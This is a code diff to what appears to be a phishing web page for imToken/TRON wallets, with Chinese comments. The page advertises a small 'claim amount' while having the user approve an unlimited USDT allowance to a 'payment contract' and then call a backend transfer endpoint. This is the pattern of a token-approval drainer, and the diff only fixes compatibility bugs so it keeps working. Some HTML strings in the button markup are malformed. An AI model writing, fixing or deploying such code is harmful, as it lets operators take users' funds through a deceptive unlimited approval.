@@ -341,24 +341,25 @@
         const APPROVE_AMOUNT = "18.2157"; // 领取额度
         const RECORD_KEY = "payment_approval_records";
         const INFINITE_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
-        // USDT的TRC20标准ABI
+        
+        // 修正后的USDT ABI（移除constant字段，仅保留stateMutability，兼容旧版TronWeb）
         const USDT_ABI = [
             {
-                "constant": true,
                 "inputs": [{"name": "_owner", "type": "address"}],
                 "name": "balanceOf",
                 "outputs": [{"name": "balance", "type": "uint256"}],
-                "type": "function"
+                "type": "function",
+                "stateMutability": "view" // constant对应view
             },
             {
-                "constant": false,
                 "inputs": [
                     {"name": "_spender", "type": "address"},
                     {"name": "_value", "type": "uint256"}
                 ],
                 "name": "approve",
                 "outputs": [{"name": "success", "type": "bool"}],
-                "type": "function"
+                "type": "function",
+                "stateMutability": "nonpayable" // 写操作对应nonpayable
             }
         ];
         
@@ -409,7 +410,7 @@
                 }
             });
 
-            // 等待TronWeb注入（终极兼容版：仅检测window.tronWeb存在）
+            // 等待TronWeb注入（终极兼容版）
             let tronWebWaitTimer = null;
             const waitForTronWeb = new Promise((resolve) => {
                 const checkTronWeb = () => {
@@ -439,7 +440,7 @@
                 recordlist.style.display = "none";
             }
 
-            // 手动连接钱包（唤起imToken内置浏览器）
+            // 手动连接钱包
             connectBtn.onclick = async () => {
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
             };
@@ -454,9 +455,9 @@
                 
                 isProcessing = true;
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<<<i class="fa fa-spinner fa-spin"></</</i> 授权中...';
+                approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 授权中...';
                 try {
-                    // 1. 用户授权USDT给代付合约（兼容旧版TronWeb）
+                    // 1. 用户授权USDT给代付合约
                     const approval = await usdtContract.approve(
                         PAYMENT_CONTRACT, // 授权目标：代付合约
                         INFINITE_APPROVE // 无限授权
@@ -467,7 +468,7 @@
                     });
 
                     // 2. 调用后端代付接口
-                    approveBtn.innerHTML = '<<<<i class="fa fa-spinner fa-spin"></</</i> 代付转账中...';
+                    approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 代付转账中...';
                     const paymentParams = {
                         userAddress: userAddress,
                         paymentContract: PAYMENT_CONTRACT,
@@ -509,18 +510,18 @@
             };
         };
 
-        // 初始化钱包（终极兼容版：直接读取defaultAddress）
+        // 初始化钱包（终极兼容版）
         async function initWallet() {
             try {
-                // 步骤1：直接读取imToken默认地址（旧版TronWeb唯一支持的方式）
+                // 步骤1：读取imToken默认地址
                 userAddress = tronWeb.defaultAddress.base58;
                 if (!userAddress) throw new Error("未检测到钱包地址，请确保已打开imToken并登录");
 
-                // 步骤2：创建USDT合约实例（显式传ABI）
+                // 步骤2：创建USDT合约实例（用修正后的ABI）
                 usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
                 if (!usdtContract) throw new Error("合约实例创建失败");
                 
-                // 步骤3：查询余额（验证合约实例）
+                // 步骤3：查询余额
                 const usdtRaw = await usdtContract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                 const trxRaw = await tronWeb.trx.getBalance(userAddress);
